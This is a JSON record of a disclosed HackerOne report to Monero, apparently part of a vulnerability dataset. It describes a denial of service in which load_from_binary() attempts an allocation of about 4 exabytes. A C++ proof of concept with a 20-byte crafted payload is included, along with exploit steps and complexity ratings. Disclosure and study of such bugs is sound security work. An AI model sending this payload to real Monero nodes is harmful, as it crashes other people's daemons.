{
  "reported_to": "Monero",
  "reported_by": "guido ",
  "title": "(remote) exabyte allocation via load_from_binary() (DoS)",
  "content": "\nChanges introduced in commit b82efa32e can result in a denial of service if epee::serialization::portable_storage::load_from_binary() is called with untrusted data.\nThe 'reserve' method implemented here:\nhttps://github.com/monero-project/monero/commit/b82efa32e771f653c5e49165b0659c67e2db3438#diff-8de201c60a8c7a3a0a4c2e15f2c0939bR75\nwill attempt to allocate about 4 exabytes of memory when you run the following code:\nCode 526 Bytes\n1#include <serialization/keyvalue_serialization.h>\n2#include <storages/portable_storage_template_helper.h>\n3#include <storages/portable_storage_base.h>\n4#include <p2p/p2p_protocol_defs.h>\n5#include <p2p/net_node.h>\n6\n7int main(void)\n8{\n9    unsigned char payload[] = {\n10        0x01, 0x11, 0x01, 0x01, 0x01, 0x01, 0x02, 0x01, 0x01, 0x08, 0x00, 0x84,\n11        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff\n12    };\n13\n14    const std::string s(payload, payload + 20);\n15    epee::serialization::portable_storage ps;\n16    ps.load_from_binary(s);\n17}\nAlthough I haven't yet constructed a proof of concept against a live Monero instance, this can probably achieved by a remote attacker because the load_from_binary call occurs several times in the network code in contrib/epee/include/storages/levin_abstract_invoke2.h.\nPlease let me know if this is sufficient, or that you require proof of concept code that can be used against peers on the network.\nImpact\nCrash monerod\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": 3,
  "weaknesses": [
    "Uncontrolled Resource Consumption"
  ],
  "screenshots": {},
  "disclosed_date": 1562127120,
  "report_url": "https://hackerone.com/reports/506498",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Create a binary payload with specific bytes that trigger the memory allocation issue."
    ],
    [
      2,
      "Pass this payload to the `load_from_binary()` function in the Monero codebase."
    ]
  ],
  "vuln_description": "The vulnerability allows a remote attacker to cause a denial of service (DoS) by exploiting a memory allocation issue in the `load_from_binary()` function. By sending a specially crafted binary payload, the function attempts to allocate an exorbitant amount of memory (4 exabytes), leading to a crash of the Monero daemon (`monerod`).",
  "reason": "The vulnerability involves a single, straightforward component\u2014the `load_from_binary()` function\u2014and the attack is triggered by a simple, malicious payload. The interaction is direct and does not require complex application state manipulation or novel logic.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}